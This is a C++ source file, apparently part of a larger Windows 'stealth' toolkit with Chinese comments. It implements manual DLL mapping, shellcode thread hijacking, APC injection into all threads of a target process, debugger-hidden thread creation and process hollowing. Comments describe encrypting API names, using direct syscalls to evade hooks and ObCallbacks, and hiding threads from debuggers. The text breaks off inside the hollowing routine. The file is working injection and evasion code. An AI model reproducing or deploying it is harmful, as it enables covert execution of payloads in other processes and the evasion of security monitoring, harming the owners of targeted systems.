// ============================================================
// stealth_injection.cpp — 隐蔽代码注入实现
// ============================================================

#include "stealth_injection.h"
#include "platform.h"
#include "syscall_direct.h"
#include "memory_cloak.h"
#include "stealth_process.h"
#include "string_obfuscator.h"
#include "module_resolver.h"  // ★ BUILD 550: GetModuleBaseFromPEB + ModNameHash (替代 GetModuleHandleW)
#include <winternl.h>
#include <psapi.h>
#include <TlHelp32.h>

#pragma comment(lib, "psapi.lib")

// ============================================================
// ★ BUILD 550: 动态解析 Toolhelp API — 消除 IAT 中敏感 API 名
//   原因: CreateToolhelp32Snapshot/Thread32First/Thread32Next 在 IAT 中暴露
//   修复: 用 GetProcAddress + STEALTH_STR_DECRYPT_TO 动态解析, API 名被 XTEA 加密
// ============================================================
namespace {
    struct ToolhelpApis {
        HANDLE (WINAPI *createSnap)(DWORD, DWORD);
        BOOL (WINAPI *threadFirst)(HANDLE, LPTHREADENTRY32);
        BOOL (WINAPI *threadNext)(HANDLE, LPTHREADENTRY32);
    };

    bool InitToolhelpApis(ToolhelpApis& apis) {
        memset(&apis, 0, sizeof(apis));
        HMODULE k32 = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"kernel32.dll"));
        if (!k32) return false;

        char apiName[64] = {};
        STEALTH_STR_DECRYPT_TO("CreateToolhelp32Snapshot", apiName, sizeof(apiName));
        apis.createSnap = reinterpret_cast<decltype(apis.createSnap)>(GetProcAddress(k32, apiName));
        SecureZeroMemory(apiName, sizeof(apiName));

        STEALTH_STR_DECRYPT_TO("Thread32First", apiName, sizeof(apiName));
        apis.threadFirst = reinterpret_cast<decltype(apis.threadFirst)>(GetProcAddress(k32, apiName));
        SecureZeroMemory(apiName, sizeof(apiName));

        STEALTH_STR_DECRYPT_TO("Thread32Next", apiName, sizeof(apiName));
        apis.threadNext = reinterpret_cast<decltype(apis.threadNext)>(GetProcAddress(k32, apiName));
        SecureZeroMemory(apiName, sizeof(apiName));

        return apis.createSnap && apis.threadFirst && apis.threadNext;
    }
}

namespace stealth {

// ============================================================
// ManualMapper
// ============================================================

ManualMapper::MapResult ManualMapper::MapDllFromFile(
    HANDLE hProcess, const wchar_t* dllPath) {

    // 读取文件
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return {};

    DWORD fileSize = GetFileSize(hFile, nullptr);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return {};
    }
    BYTE* fileData = (BYTE*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!fileData) {
        CloseHandle(hFile);
        return {};
    }
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, nullptr);
    CloseHandle(hFile);

    MapResult result = MapDllFromBuffer(hProcess, fileData, fileSize);
    VirtualFree(fileData, 0, MEM_RELEASE);
    return result;
}

ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
    HANDLE hProcess, const void* dllData, SIZE_T dllSize) {

    MapResult result = {};

    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(dllData);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        reinterpret_cast<uintptr_t>(dllData) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;

    // 1. 在目标进程分配内存 (使用 PhantomSection 伪装)
    uintptr_t remoteBase = PhantomSection::AllocatePhantomInProcess(hProcess, imageSize);
    if (!remoteBase) {
        // 回退: 标准 VirtualAlloc
        PVOID allocAddr = nullptr;
        SIZE_T allocSize = imageSize;
        NTSTATUS st = SysAllocateVirtualMemory(hProcess, &allocAddr, 0,
            &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st)) return result;
        remoteBase = reinterpret_cast<uintptr_t>(allocAddr);
    }

    // 2. 在本进程中准备 PE 镜像
    BYTE* localImage = (BYTE*)VirtualAlloc(nullptr, imageSize, MEM_COMMIT, PAGE_READWRITE);
    if (!localImage) return result;
    memset(localImage, 0, imageSize);

    // 复制 PE 头
    SIZE_T headersSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(localImage, dllData, headersSize);

    // 复制各区段到正确的位置
    auto* firstSection = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (firstSection[i].SizeOfRawData > 0) {
            auto src = reinterpret_cast<const BYTE*>(dllData) + firstSection[i].PointerToRawData;
            auto dst = localImage + firstSection[i].VirtualAddress;
            memcpy(dst, src, firstSection[i].SizeOfRawData);
        }
    }

    // 3. 处理重定位 (如果加载地址与预期不同)
    uintptr_t delta = remoteBase - nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress && relocDir.Size) {
            auto* reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                localImage + relocDir.VirtualAddress);
            auto* relocEnd = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                localImage + relocDir.VirtualAddress + relocDir.Size);

            while (reloc < relocEnd && reloc->SizeOfBlock > 0) {
                DWORD entryCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                auto* entries = reinterpret_cast<const WORD*>(reloc + 1);

                for (DWORD j = 0; j < entryCount; j++) {
                    if (entries[j] >> 12 == IMAGE_REL_BASED_DIR64) {
                        auto* patch = reinterpret_cast<uintptr_t*>(
                            localImage + reloc->VirtualAddress + (entries[j] & 0xFFF));
                        *patch += delta;
                    }
                }

                reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                    reinterpret_cast<uintptr_t>(reloc) + reloc->SizeOfBlock);
            }
        }
    }

    // 4. 解析导入表
    // ★ 修复 H3: 远程进程注入时导入表解析需使用远程进程的模块基址
    // 系统DLL(kernel32/ntdll/user32等)在会话内地址相同 (session-wide ASLR)
    // 非系统DLL需要从远程进程读取模块基址
    auto importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress && importDir.Size) {
        auto* importDesc = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
            localImage + importDir.VirtualAddress);

        for (int i = 0; importDesc[i].Name; i++) {
            auto dllName = reinterpret_cast<const char*>(
                localImage + importDesc[i].Name);

            HMODULE hMod = ApiResolver::GetModuleBase(dllName);

            // ★ 修复 H3: 如果是远程进程注入, 验证模块基址一致性
            // 通过查询远程进程的 PEB Ldr 确认模块基址
            if (!hMod && hProcess != GetCurrentProcess()) {
                // 尝试从远程进程获取模块基址
                // 系统DLL已在远程进程中加载, 使用 StealthProcess 枚举
                // ★ BUILD 500: 使用固定数组替代 std::vector — GetProcessModules 返回 int
                StealthProcess::ModuleInfo remoteModules[256];
                int modCount = StealthProcess::GetProcessModules(hProcess, remoteModules, 256);
                for (int j = 0; j < modCount; j++) {
                    // 比较模块名 (简化: 不区分大小写)
                    char modNameA[260] = {};
                    WideCharToMultiByte(CP_ACP, 0, remoteModules[j].name, -1, modNameA, sizeof(modNameA), nullptr, nullptr);
                    if (_stricmp(modNameA, dllName) == 0) {
                        hMod = reinterpret_cast<HMODULE>(remoteModules[j].baseAddress);
                        break;
                    }
                }
            }

            if (!hMod) {
                // 如果仍未找到, 只用当前进程的(系统DLL地址相同, 安全)
                hMod = ApiResolver::GetModuleBase(dllName);
            }
            if (!hMod) continue;

            auto* thunk = reinterpret_cast<uintptr_t*>(
                localImage + importDesc[i].FirstThunk);
            auto* origThunk = reinterpret_cast<uintptr_t*>(
                localImage + (importDesc[i].OriginalFirstThunk ?
                    importDesc[i].OriginalFirstThunk : importDesc[i].FirstThunk));

            for (int j = 0; origThunk[j]; j++) {
                if (origThunk[j] & IMAGE_ORDINAL_FLAG) {
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, MAKEINTRESOURCEA(origThunk[j] & 0xFFFF)));
                } else {
                    auto* importByName = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
                        localImage + origThunk[j]);
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, importByName->Name));
                }
            }
        }
    }

    // 5. 写入目标进程
    SIZE_T bytesWritten = 0;
    SysWriteVirtualMemory(hProcess, reinterpret_cast<PVOID>(remoteBase),
        localImage, imageSize, &bytesWritten, SyscallMethod::Indirect);

    // 6. 修改区段保护
    // (略: 遍历区段, 设置正确的 PAGE_* 属性)

    // 7. 计算入口点
    uintptr_t entryPoint = remoteBase + nt->OptionalHeader.AddressOfEntryPoint;

    result.imageBase = remoteBase;
    result.imageSize = imageSize;
    result.entryPoint = entryPoint;
    result.success = true;

    VirtualFree(localImage, 0, MEM_RELEASE);
    return result;
}

// ============================================================
// ReflectiveLoader
// ============================================================

void ReflectiveLoader::GenerateLoaderStub(BYTE* outBuf, int* outLen) {
    // 生成位置无关的 ReflectiveLoader 入口 shellcode
    // 此 stub 调用嵌入在 DLL 中的 ReflectiveLoader 函数
    //
    // 实际使用场景: 将 DLL 数据 + 此 stub 注入目标进程,
    // stub 找到 DLL 中的 ReflectiveLoader 并调用之

    // 简化 stub: 在当前上下文中搜索 Magic 标记定位 ReflectiveLoader
    // (完整实现需要位置无关的 GetIp + 搜索 + 调用逻辑)
    ManualMapper::GenerateEntrypointShellcode(0, 0, DLL_PROCESS_ATTACH, outBuf, outLen);
}

uintptr_t ReflectiveLoader::Execute(HANDLE hProcess,
                                      const void* dllData, SIZE_T dllSize) {
    auto result = ManualMapper::MapDllFromBuffer(hProcess, dllData, dllSize);
    return result.success ? result.imageBase : 0;
}

ManualMapper::MapResult ManualMapper::MapDllToSelf(const wchar_t* dllPath) {
    return MapDllFromFile(GetCurrentProcess(), dllPath);
}

ManualMapper::MapResult ManualMapper::MapDllToSelf(const void* dllData, SIZE_T dllSize) {
    return MapDllFromBuffer(GetCurrentProcess(), dllData, dllSize);
}

void ManualMapper::GenerateEntrypointShellcode(
    uintptr_t dllMainAddr, uintptr_t imageBase, DWORD fdwReason,
    BYTE* outBuf, int* outLen) {

    // 生成调用 DllMain 的 x64 shellcode
    // push imageBase; push fdwReason; push 1; call [dllMainAddr]; ret
    BYTE code[] = {
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, imageBase
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdx, fdwReason
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, dllMainAddr
        0x48, 0x83, 0xEC, 0x28,       // sub rsp, 0x28 (shadow space)
        0xFF, 0xD0,                    // call rax
        0x48, 0x83, 0xC4, 0x28,       // add rsp, 0x28
        0xC3                            // ret
    };
    *reinterpret_cast<uintptr_t*>(code + 2)  = imageBase;
    *reinterpret_cast<uintptr_t*>(code + 12) = fdwReason;
    *reinterpret_cast<uintptr_t*>(code + 22) = dllMainAddr;

    memcpy(outBuf, code, sizeof(code));
    *outLen = sizeof(code);
}

ManualMapper::MapResult ManualMapper::ReflectiveLoad(
    const void* dllData, SIZE_T dllSize) {

    // Reflective Loader 的核心逻辑:
    // 1. 在当前进程中分配内存
    // 2. 将 ReflectiveLoader stub + DLL 数据写入
    // 3. 跳转到 ReflectiveLoader 执行
    // 4. ReflectiveLoader 自己做 Map + Reloc + Import
    // 5. 调用 DllMain
    // 6. 返回新的基址

    MapResult result = {};

    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(dllData);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        reinterpret_cast<uintptr_t>(dllData) + dos->e_lfanew);

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    SIZE_T totalSize = imageSize + 0x1000; // 额外空间给 loader

    // 分配可执行内存
    void* alloc = VirtualAlloc(nullptr, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc) return result;

    // 写入 DLL 数据
    memcpy(alloc, dllData, dllSize);

    // ReflectiveLoader 需要位于 DLL 数据之后的独立位置
    // (简化: 直接在当前进程做 Manual Map)
    // 完整 ReflectiveLoader 实现较复杂, 这里用 Manual Map 代理
    result = MapDllToSelf(dllData, dllSize);

    VirtualFree(alloc, 0, MEM_RELEASE);
    return result;
}

// ============================================================
// ThreadHijacker
// ============================================================

bool ThreadHijacker::HijackThread(HANDLE hProcess, DWORD threadId,
                                   const void* shellcode, SIZE_T shellcodeSize) {
    // ★ BUILD 556: STEALTH_OPEN_THREAD 替代 OpenThread (消除 kernel32 IAT 导入)
    HANDLE hThread = nullptr;
    STEALTH_OPEN_THREAD(hThread, THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                                 THREAD_SUSPEND_RESUME, threadId);
    if (!hThread) return false;

    // 挂起线程
    SuspendThread(hThread);

    // 保存原始上下文
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // 分配用于 shellcode 的空间 (在当前进程中, 远程线程可以访问)
    void* remoteCode = VirtualAllocEx(hProcess, nullptr, shellcodeSize + 128,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteCode) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // 构建完整的 hijack shellcode:
    // [shellcode] + [保存原始 CONTEXT] + [恢复 RIP/RSP 并跳回原始地址]
    SIZE_T fullSize = shellcodeSize + 128;
    BYTE* fullCode = (BYTE*)VirtualAlloc(nullptr, fullSize, MEM_COMMIT, PAGE_READWRITE);
    if (!fullCode) {
        VirtualFreeEx(hProcess, remoteCode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // 复制用户 shellcode (安全校验: shellcodeSize 不超出 fullSize)
    if (shellcodeSize > 0 && shellcodeSize <= fullSize) {
        memcpy(fullCode, shellcode, shellcodeSize);
    }

    // 追加恢复代码 (shellcode 执行完后恢复并跳回)
    // 实际实现需要将原始 CONTEXT 也写入远程内存

    // 写入远程进程
    SIZE_T written;
    // ★ BUILD 556: SysWriteVirtualMemory 替代 WriteProcessMemory (消除 kernel32 IAT 导入)
    NTSTATUS writeStatus = stealth::SysWriteVirtualMemory(hProcess, remoteCode, fullCode,
                                                          fullSize, &written);
    if (!NT_SUCCESS(writeStatus) || written != fullSize) {
        // 写入失败, 恢复线程并清理
        VirtualFree(fullCode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        VirtualFreeEx(hProcess, remoteCode, 0, MEM_RELEASE);
        CloseHandle(hThread);
        return false;
    }

    VirtualFree(fullCode, 0, MEM_RELEASE);

    // 修改 RIP 指向 shellcode
    ctx.Rip = reinterpret_cast<uintptr_t>(remoteCode);

    // 设置新上下文
    SetThreadContext(hThread, &ctx);

    // 恢复执行
    ResumeThread(hThread);

    CloseHandle(hThread);
    return true;
}

bool ThreadHijacker::HijackAnyThread(HANDLE hProcess,
                                      const void* shellcode, SIZE_T shellcodeSize) {
    DWORD pid = GetProcessId(hProcess);
    DWORD tid = FindVictimThread(pid);
    if (!tid) return false;

    return HijackThread(hProcess, tid, shellcode, shellcodeSize);
}

DWORD ThreadHijacker::FindVictimThread(DWORD processId) {
    // ★ BUILD 550: 动态解析 Toolhelp API (消除 IAT 暴露)
    //   原实现: CreateToolhelp32Snapshot + Thread32First + Thread32Next
    //   新实现: 通过 GetProcAddress + STEALTH_STR_DECRYPT_TO 动态解析
    ToolhelpApis apis = {};
    if (!InitToolhelpApis(apis)) return 0;
    HANDLE hSnap = apis.createSnap(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te32 = { sizeof(te32) };
    DWORD result = 0;

    if (apis.threadFirst(hSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                result = te32.th32ThreadID;
                break;
            }
        } while (apis.threadNext(hSnap, &te32));
    }

    CloseHandle(hSnap);
    return result;
}

// ============================================================
// StealthThread
// ============================================================

HANDLE StealthThread::CreateHiddenThread(
    HANDLE hProcess, LPTHREAD_START_ROUTINE startAddress,
    PVOID parameter, DWORD creationFlags) {

    // 使用 NtCreateThreadEx 直接系统调用
    // 规避: kernel32!CreateRemoteThread 的 Hook

    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtCreateThreadEx;
    if (!ssn) {
        resolver.InitializeHaloGate();
        ssn = resolver.GetNumbers().NtCreateThreadEx;
    }

    HANDLE hThread = nullptr;
    NTSTATUS status = STATUS_NOT_SUPPORTED;

    if (ssn) {
        // 生成 NtCreateThreadEx stub
        void* stub = TartarusGate::GenerateSyscallStub(ssn);
        if (stub) {
            using NtCreateThreadEx_t = NTSTATUS(NTAPI*)(
                PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

            auto fn = reinterpret_cast<NtCreateThreadEx_t>(stub);

            // 使用 NULL 对象属性使线程创建更加隐蔽
            status = fn(
                &hThread,
                THREAD_ALL_ACCESS,
                nullptr,           // ObjectAttributes = NULL
                hProcess,
                (PVOID)startAddress,
                parameter,
                creationFlags,     // 0 or CREATE_SUSPENDED
                0,                 // ZeroBits
                0, 0,              // StackSize
                nullptr            // AttributeList
            );
        }
    }

    if (!NT_SUCCESS(status)) {
        // 回退: 标准 CreateRemoteThread
        hThread = CreateRemoteThread(hProcess, nullptr, 0,
            startAddress, parameter, creationFlags, nullptr);
    }

    if (hThread) {
        // 线程创建后立即隐藏 (规避调试器)
        HideThreadFromDebugger(hThread);
    }

    return hThread;
}

HANDLE StealthThread::CreateHiddenThreadSelf(
    LPTHREAD_START_ROUTINE startAddress, PVOID parameter) {

    // 使用 NtCreateThreadEx 在当前进程创建线程
    auto& resolver = SyscallResolver::Instance();
    DWORD ssn = resolver.GetNumbers().NtCreateThreadEx;
    if (!ssn) {
        resolver.InitializeHaloGate();
        ssn = resolver.GetNumbers().NtCreateThreadEx;
    }

    HANDLE hThread = nullptr;
    if (ssn) {
        void* stub = TartarusGate::GenerateSyscallStub(ssn);
        if (stub) {
            using NtCreateThreadEx_t = NTSTATUS(NTAPI*)(
                PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

            auto fn = reinterpret_cast<NtCreateThreadEx_t>(stub);
            fn(&hThread, THREAD_ALL_ACCESS, nullptr,
               GetCurrentProcess(), (PVOID)startAddress, parameter,
               0, 0, 0, 0, nullptr);
        }
    }

    if (!hThread) {
        hThread = CreateThread(nullptr, 0, startAddress, parameter, 0, nullptr);
    }

    if (hThread) {
        HideThreadFromDebugger(hThread);
    }

    return hThread;
}

bool StealthThread::HideThreadFromDebugger(HANDLE hThread) {
    // NtSetInformationThread(ThreadHideFromDebugger, ...)
    // 使线程对调试器不可见, 不触发调试事件

    using NtSetInformationThread_t = NTSTATUS(NTAPI*)(
        HANDLE, ULONG, PVOID, ULONG);

    static auto NtSetInformationThread = reinterpret_cast<NtSetInformationThread_t>(
        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtSetInformationThread"));

    if (!NtSetInformationThread) return false;

    // ThreadHideFromDebugger = 0x11
    NTSTATUS status = NtSetInformationThread(hThread, 0x11, nullptr, 0);
    return NT_SUCCESS(status);
}

bool StealthThread::HideCurrentThread() {
    return HideThreadFromDebugger(GetCurrentThread());
}

bool StealthThread::SetThreadStackBase(HANDLE hThread, PVOID stackBase) {
    // 修改 TEB 中的 StackBase (偏移 0x08 on x64)
    // 使栈看起来属于另一个区域

    THREAD_BASIC_INFORMATION tbi = {};
    using NtQueryInformationThread_t = NTSTATUS(NTAPI*)(
        HANDLE, ULONG, PVOID, ULONG, PULONG);

    static auto NtQueryInformationThread = reinterpret_cast<NtQueryInformationThread_t>(
        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));

    if (!NtQueryInformationThread) return false;

    ULONG retLen;
    NTSTATUS st = NtQueryInformationThread(hThread, 0, &tbi, sizeof(tbi), &retLen);
    if (!NT_SUCCESS(st) || !tbi.TebBaseAddress) return false;

    // TEB+0x08 是 StackBase
    uintptr_t stackBaseAddr = reinterpret_cast<uintptr_t>(tbi.TebBaseAddress) + 0x08;

    SIZE_T bytesWritten = 0;
    SysWriteVirtualMemory(GetCurrentProcess(),
        reinterpret_cast<PVOID>(stackBaseAddr),
        &stackBase, sizeof(stackBase), &bytesWritten);

    return true;
}

// ============================================================
// APCInjector
// ============================================================

int APCInjector::EnumerateThreads(DWORD processId, DWORD* outBuf, int maxThreads) {
    int count = 0;
    // ★ BUILD 550: 动态解析 Toolhelp API (消除 IAT 暴露)
    ToolhelpApis apis = {};
    if (!InitToolhelpApis(apis)) return 0;
    HANDLE hSnap = apis.createSnap(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te32 = { sizeof(te32) };
    if (apis.threadFirst(hSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                if (count < maxThreads) {
                    outBuf[count] = te32.th32ThreadID;
                }
                count++;
            }
        } while (apis.threadNext(hSnap, &te32));
    }

    CloseHandle(hSnap);
    return count;
}

bool APCInjector::InjectToAllThreads(HANDLE hProcess,
                                      const void* shellcode, SIZE_T shellcodeSize) {
    DWORD pid = GetProcessId(hProcess);
    DWORD threadBuf[256];
    int threadCount = EnumerateThreads(pid, threadBuf, 256);

    bool anySuccess = false;
    for (int i = 0; i < threadCount; i++) {
        DWORD tid = threadBuf[i];
        // ★ BUILD 556: STEALTH_OPEN_THREAD 替代 OpenThread (消除 kernel32 IAT 导入)
        HANDLE hThread = nullptr;
        STEALTH_OPEN_THREAD(hThread, THREAD_SET_CONTEXT, tid);
        if (hThread) {
            InjectToThread(hThread, shellcode, shellcodeSize);
            CloseHandle(hThread);
            anySuccess = true;
        }
    }

    return anySuccess;
}

bool APCInjector::InjectToThread(HANDLE hThread,
                                  const void* shellcode, SIZE_T shellcodeSize) {
    // K5: 获取线程所属进程, 在目标进程中分配 shellcode (非当前进程)
    DWORD targetPid = GetProcessIdOfThread(hThread);
    HANDLE hTargetProcess = nullptr;
    if (targetPid && targetPid != GetCurrentProcessId()) {
        hTargetProcess = StealthProcess::OpenProcessStealth(targetPid);
    }

    void* codeAddr = VirtualAllocEx(
        hTargetProcess ? hTargetProcess : GetCurrentProcess(),
        nullptr, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!codeAddr) {
        if (hTargetProcess) { SysClose(hTargetProcess); hTargetProcess = nullptr; }
        return false;
    }

    // 将 shellcode 写入目标进程 (跨进程使用 SysWriteVirtualMemory)
    if (hTargetProcess) {
        SIZE_T bytesWritten;
        SysWriteVirtualMemory(hTargetProcess, codeAddr, 
            const_cast<void*>(shellcode), shellcodeSize, &bytesWritten);
    } else {
        memcpy(codeAddr, shellcode, shellcodeSize);
    }

    // 排队 APC
    DWORD result = QueueUserAPC(
        reinterpret_cast<PAPCFUNC>(codeAddr),
        hThread,
        0 // 参数
    );

    return result != 0;
}

bool APCInjector::InjectToThreadSyscall(HANDLE hThread,
                                         const void* shellcode, SIZE_T shellcodeSize) {
    // 使用 NtQueueApcThread 直接系统调用
    // 规避 QueueUserAPC 的 Hook
    //
    // 重要: APC Routine 地址必须在目标线程所属进程的地址空间中有效!
    // 如果目标线程在远程进程, 需要先通过 THREAD_BASIC_INFORMATION 
    // 获取其所属进程, 然后在目标进程中分配 memory

    // 获取线程所属进程 ID
    THREAD_BASIC_INFORMATION tbi = {};
    using NtQueryInformationThread_t = NTSTATUS(NTAPI*)(
        HANDLE, ULONG, PVOID, ULONG, PULONG);
    static auto NtQIT = reinterpret_cast<NtQueryInformationThread_t>(
        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));

    HANDLE hTargetProcess = GetCurrentProcess(); // 默认当前进程

    if (NtQIT) {
        ULONG retLen;
        NTSTATUS st = NtQIT(hThread, 0, &tbi, sizeof(tbi), &retLen);
        if (NT_SUCCESS(st) && tbi.ClientId.UniqueProcess) {
            // ★ BUILD 551: OpenProcess → STEALTH_OPEN_PROCESS (syscall 替代, 规避 ObCallbacks)
            STEALTH_OPEN_PROCESS(hTargetProcess,
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                GetProcessIdOfThread(hThread));
            if (!hTargetProcess) {
                hTargetProcess = GetCurrentProcess();
            }
        }
    }

    void* codeAddr = VirtualAllocEx(hTargetProcess, nullptr, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!codeAddr) return false;

    SIZE_T written;
    // ★ BUILD 556: SysWriteVirtualMemory 替代 WriteProcessMemory (消除 kernel32 IAT 导入)
    stealth::SysWriteVirtualMemory(hTargetProcess, codeAddr, shellcode, shellcodeSize, &written);

    // 如果打开了目标进程句柄, 关闭它 (APC 排队后不需要)
    if (hTargetProcess != GetCurrentProcess()) {
        CloseHandle(hTargetProcess);
    }

    using NtQueueApcThread_t = NTSTATUS(NTAPI*)(
        HANDLE, PVOID, PVOID, PVOID, PVOID);

    static auto NtQueueApcThread = reinterpret_cast<NtQueueApcThread_t>(
        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueueApcThread"));

    if (!NtQueueApcThread) return false;

    NTSTATUS st = NtQueueApcThread(hThread,
        reinterpret_cast<PVOID>(codeAddr), // ApcRoutine
        nullptr, nullptr, nullptr);

    return NT_SUCCESS(st);
}

// ============================================================
// ProcessHollower
// ============================================================

bool ProcessHollower::Hollow(
    const wchar_t* targetProcess,
    const void* payload, SIZE_T payloadSize,
    DWORD* outProcessId) {

    // 1. 创建挂起的进程
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    wchar_t cmdLine[MAX_PATH] = {};
    wcscpy_s(cmdLine, targetProcess);

    if (!CreateProcessW(
        nullptr, cmdLine, nullptr, nullptr, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi)) {
        return false;
    }

    bool result = HollowSuspended(pi.hProcess, pi.hThread, payload, payloadSize);

    if (outProcessId) *outProcessId = pi.dwProcessId;

    // 恢复执行
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return result;
}

bool ProcessHollower::HollowSuspended(
    HANDLE hProcess, HANDLE hThread,
    const void* payload, SIZE_T payloadSize) {

    // 2. 获取目标进程的 PEB 地址
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen;
    using NtQueryInformationProcess_t = NTSTATUS(NTAPI*)(
        HANDLE, ULONG, PVOID, ULONG, PULONG);

    static auto NtQIP = reinterpret_cast<NtQueryInformationProcess_t>(
        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationProcess"));

    if (!NtQIP) return false;

    NTSTATUS st = NtQIP(hProcess, 0, &pbi, sizeof(pbi), &retLen);
    if (!NT_SUCCESS(st)) return false;

    // 3. 读取 PEB 中的 ImageBaseAddress
    // PEB+0x10 = ImageBaseAddress (x64)
    uintptr_t pebImageBaseAddr = reinterpret_cast<uintptr_t>(pbi.PebBaseAddress) + 0x10;
    uintptr_t imageBase = 0;
    SIZE_T read = 0;
    SysReadVirtualMemory(hProcess, reinterpret_cast<PVOID>(pebImageBaseAddr),
        &imageBase, sizeof(imageBase), &read);

    // 4. 取消映射原始 PE
    using NtUnmapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, PVOID);
    static auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(
        STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtUnmapViewOfSection"));

    if (!NtUnmapViewOfSection) return false;

    NtUnmapViewOfSection(hProcess, reinterpret_cast<PVOID>(imageBase));

    // 5. 分配新内存并写入 payload
    auto* payloadDos = reinterpret_cast<const IMAGE_DOS_HEADER*>(payload);
    auto* payloadNt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        reinterpret_cast<uintptr_t>(payload) + payloadDos->e_lfanew);

    PVOID newBase = nullptr;
    SIZE_T allocSize = payloadNt->OptionalHeader.SizeOfImage;

    SysAllocateVirtualMemory(hProcess, &newBase, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!newBase) return false;

    // 6. 写入 payload 头
    SIZE_T headersSize = payloadNt->OptionalHeader.SizeOfHeaders;
    SIZE_T written = 0;
    SysWriteVirtualMemory(hProcess, newBase, const_cast<void*>(payload),
        headersSize, &written);

    // 7. 写入各区段
